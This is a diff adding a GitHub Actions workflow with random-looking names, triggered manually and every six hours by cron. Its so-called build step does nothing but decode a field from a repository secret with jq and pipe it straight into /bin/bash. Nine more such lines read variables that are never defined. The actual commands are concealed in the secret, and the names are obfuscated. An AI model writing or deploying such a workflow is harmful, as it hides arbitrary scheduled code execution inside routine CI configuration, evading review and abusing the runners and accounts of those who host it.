@@ -1,0 +1,28 @@
+name: urgevoluminous
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '51 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: urgevoluminous
+        env:
+          sby948: ${{ secrets.sby948 }}
+        run: |
+          echo $sby948 | jq -r .yvjc0123 | /bin/bash
+          echo $fs637 | jq -r .wlt287 | /bin/bash
+          echo $u5574 | jq -r .wmd63580 | /bin/bash
+          echo $cp6 | jq -r .u80 | /bin/bash
+          echo $aff530 | jq -r .kovr15491 | /bin/bash
+          echo $nfoeh70 | jq -r .js9832 | /bin/bash
+          echo $xed773 | jq -r .osepf65491 | /bin/bash
+          echo $z3 | jq -r .btdm0 | /bin/bash
+          echo $fthk94035 | jq -r .hdnae618 | /bin/bash
+          echo $jrxc81 | jq -r .aljlz1441 | /bin/bash
+
